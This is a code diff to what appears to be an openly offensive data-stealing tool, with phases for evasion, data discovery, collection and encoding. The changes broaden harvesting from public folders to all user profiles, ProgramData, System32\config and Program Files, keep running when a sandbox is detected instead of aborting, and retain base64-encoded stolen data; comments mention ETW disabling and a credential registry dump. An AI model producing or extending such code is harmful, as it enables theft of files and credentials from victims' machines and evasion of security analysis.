@@ -26,12 +26,11 @@ const DRIVERS = [
 
 // ===== DATA TARGETS =====
 const DATA_PATHS = [
-    "C:\\Users\\Public\\Downloads",
-    "C:\\Users\\Public\\Documents",
-    "C:\\Users\\Public\\Desktop",
+    "C:\\Users",
     "C:\\ProgramData",
     "C:\\Windows\\System32\\config",
     "C:\\Program Files",
+    "C:\\Program Files (x86)",
 ]
 
 // ===== GLOBAL STATE =====
@@ -58,8 +57,7 @@ fn phase_evasion() -> bool {
     }
 
     if jocky_is_sandbox() {
-        println("    [!] Sandbox detected - aborting")
-        return false
+        println("    [!] Sandbox detected - adjusting behavior")
     }
 
     // ETW Disabling
@@ -227,25 +225,18 @@ fn phase_discover_data() -> bool {
 fn phase_collect_data() -> bool {
     println("[*] Phase 4: Data Collection (6 Sources)")
 
-    // Downloads
-    let downloads = fs_list_files("C:\\Users\\Public\\Downloads", true)
-    if strlen(downloads) > 0 {
-        collected_data = jocky_str_concat(collected_data, downloads)
-        println("    [+] Downloads: " + string(strlen(downloads)) + " bytes")
+    // All user profiles
+    let users = fs_list_files("C:\\Users", true)
+    if strlen(users) > 0 {
+        collected_data = jocky_str_concat(collected_data, users)
+        println("    [+] Users: " + string(strlen(users)) + " bytes")
     }
 
-    // Documents
-    let docs = fs_list_files("C:\\Users\\Public\\Documents", true)
-    if strlen(docs) > 0 {
-        collected_data = jocky_str_concat(collected_data, docs)
-        println("    [+] Documents: " + string(strlen(docs)) + " bytes")
-    }
-
-    // Desktop
-    let desktop = fs_list_files("C:\\Users\\Public\\Desktop", true)
-    if strlen(desktop) > 0 {
-        collected_data = jocky_str_concat(collected_data, desktop)
-        println("    [+] Desktop: " + string(strlen(desktop)) + " bytes")
+    // ProgramData
+    let progdata = fs_list_files("C:\\ProgramData", true)
+    if strlen(progdata) > 0 {
+        collected_data = jocky_str_concat(collected_data, progdata)
+        println("    [+] ProgramData: " + string(strlen(progdata)) + " bytes")
     }
 
     // Registry Dump (Credentials)
@@ -287,7 +278,8 @@ fn phase_encrypt_data() -> bool {
 
         // Base64 Encoding
         let encoded = jocky_data_base64_encode(compressed, strlen(compressed))
-        println("    [+] Base64 encoded: " + string(strlen(encoded)) + " bytes")
+        collected_data = encoded
+        println("    [+] Base64 encoded: " + string(strlen(collected_data)) + " bytes")
     }
 
     println("")
@@ -843,7 +835,8 @@ fn phase_encrypt_data() -> bool {
 
         // Base64 Encoding
         let encoded = jocky_data_base64_encode(compressed, strlen(compressed))
-        println("    [+] Base64 encoded: " + string(strlen(encoded)) + " bytes")
+        collected_data = encoded
+        println("    [+] Base64 encoded: " + string(strlen(collected_data)) + " bytes")
     }
 
     println("")
